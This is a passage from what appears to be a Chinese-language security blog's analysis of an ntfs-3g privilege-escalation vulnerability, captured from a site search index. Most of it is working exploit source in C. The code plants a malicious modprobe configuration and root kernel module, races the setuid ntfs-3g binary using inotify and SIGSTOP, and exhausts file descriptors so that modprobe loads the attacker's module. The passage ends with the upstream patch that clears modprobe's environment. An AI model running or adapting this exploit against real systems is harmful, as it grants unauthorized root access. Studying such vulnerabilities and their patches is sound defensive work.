class="built_in">strlen</span>(modprobe_config))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"modprobe config write failed"</span>);</span><br><span class="line">close(conffd);</span><br><span class="line"><span class="comment">// module directory setup</span></span><br><span class="line"><span class="keyword">char</span> system_cmd[<span class="number">1000</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(system_cmd, <span class="string">"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/"</span>,</span><br><span class="line">    <span class="keyword">template</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="keyword">if</span> (system(system_cmd))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"shell command failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/mounts.</span></span><br><span class="line"><span class="comment">// Note: /proc/mounts is a symlink to /proc/self/mounts, so</span></span><br><span class="line"><span class="comment">// the watch will only see accesses by this process.</span></span><br><span class="line"><span class="keyword">int</span> inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(inotify_fd, <span class="string">"/proc/mounts"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /proc/mounts"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/filesystems.</span></span><br><span class="line"><span class="comment">// This can be used to detect whether we lost the race.</span></span><br><span class="line"><span class="keyword">int</span> fs_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fs_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(fs_inotify_fd, <span class="string">"/proc/filesystems"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /proc/filesystems"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /sbin/modprobe.</span></span><br><span class="line"><span class="comment">// This can be used to detect when we can release all our open files.</span></span><br><span class="line"><span class="keyword">int</span> modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (modprobe_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(modprobe_inotify_fd, <span class="string">"/sbin/modprobe"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /sbin/modprobe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> do_exec_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (pipe2(do_exec_pipe, O_CLOEXEC))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"pipe"</span>);</span><br><span class="line"><span class="keyword">pid_t</span> child = fork();</span><br><span class="line"><span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read(do_exec_pipe[<span class="number">0</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">"pipe read failed"</span>);</span><br><span class="line">    <span class="keyword">char</span> modprobe_opts[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(modprobe_opts, <span class="string">"-C %s -d %s"</span>, modprobe_confdir, <span class="keyword">template</span>);</span><br><span class="line">    setenv(<span class="string">"MODPROBE_OPTIONS"</span>, modprobe_opts, <span class="number">1</span>);</span><br><span class="line">    execlp(<span class="string">"ntfs-3g"</span>, <span class="string">"ntfs-3g"</span>, volume, mountpoint, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">child = getpid();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now launch ntfs-3g and wait until it opens /proc/mounts</span></span><br><span class="line"><span class="keyword">if</span> (write(do_exec_pipe[<span class="number">1</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"pipe write failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (read(inotify_fd, buf, <span class="keyword">sizeof</span>(buf)) &lt;= <span class="number">0</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"inotify read failed"</span>);</span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGSTOP))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"can't stop setuid parent"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check whether we won the main race.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">    .fd = fs_inotify_fd,</span><br><span class="line">    .events = POLLIN</span><br><span class="line">&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> poll_res = poll(poll_fds, <span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"looks like we lost the race"</span>);</span><br><span class="line">    <span class="keyword">if</span> (kill(getppid(), SIGKILL))</span><br><span class="line">        perror(<span class="string">"SIGKILL after lost race"</span>);</span><br><span class="line">    <span class="keyword">char</span> rm_cmd[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(rm_cmd, <span class="string">"rm -rf %s"</span>, <span class="keyword">template</span>);</span><br><span class="line">    system(rm_cmd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"looks like we won the race"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open as many files as possible. Whenever we have</span></span><br><span class="line"><span class="comment">// a bunch of open files, move them into a new process.</span></span><br><span class="line"><span class="keyword">int</span> total_open_files = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> LIMIT 500</span></span><br><span class="line">    <span class="keyword">int</span> open_files[LIMIT];</span><br><span class="line">    <span class="keyword">bool</span> reached_limit = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n_open_files;</span><br><span class="line">    <span class="keyword">for</span> (n_open_files = <span class="number">0</span>; n_open_files &lt; LIMIT; n_open_files++) &#123;</span><br><span class="line">        open_files[n_open_files] = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (open_files[n_open_files] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno != ENFILE)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">"eventfd() failed"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"got ENFILE at %d total\n"</span>, total_open_files);</span><br><span class="line">            reached_limit = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        total_open_files++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> fd_stasher_child = fork();</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"fork (for eventfd holder)"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">0</span>) &#123;</span><br><span class="line">        prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">        <span class="comment">// close PR_SET_PDEATHSIG race window</span></span><br><span class="line">        <span class="keyword">if</span> (getppid() != child) raise(SIGKILL);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) pause();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n_open_files; i++)</span><br><span class="line">        close(open_files[i]);</span><br><span class="line">    <span class="keyword">if</span> (reached_limit)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wake up ntfs-3g and keep allocating files, then free up</span></span><br><span class="line"><span class="comment">// the files as soon as we're reasonably certain that either</span></span><br><span class="line"><span class="comment">// modprobe was spawned or the attack failed.</span></span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGCONT))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"SIGCONT"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">time_t</span> start_time = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> efd = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (efd == <span class="number">-1</span> &amp;&amp; errno != ENFILE)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">"gapfiller eventfd() failed unexpectedly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">modprobe_poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">        .fd = modprobe_inotify_fd,</span><br><span class="line">        .events = POLLIN</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> modprobe_poll_res = poll(modprobe_poll_fds, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"yay, modprobe ran!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (time(<span class="literal">NULL</span>) &gt; start_time + <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"modprobe didn't run?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-补丁代码，load-fuse-module-函数"><a href="#0x04-补丁代码，load-fuse-module-函数" class="headerlink" title="0x04 补丁代码，load_fuse_module()函数"></a>0x04 补丁代码，<code>load_fuse_module()</code>函数</h2><hr><p><a href="http://seclists.org/oss-sec/2017/q1/307" target="_blank" rel="noopener">http://seclists.org/oss-sec/2017/q1/307</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">+   <span class="keyword">char</span> *env = (<span class="keyword">char</span>*)<span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;  <span class="comment">/* 100 msec */</span></span><br><span class="line">    fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">            pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">-                  execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">+                  execle(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>, &amp;env);</span><br><span class="line">                    _exit(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">                    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
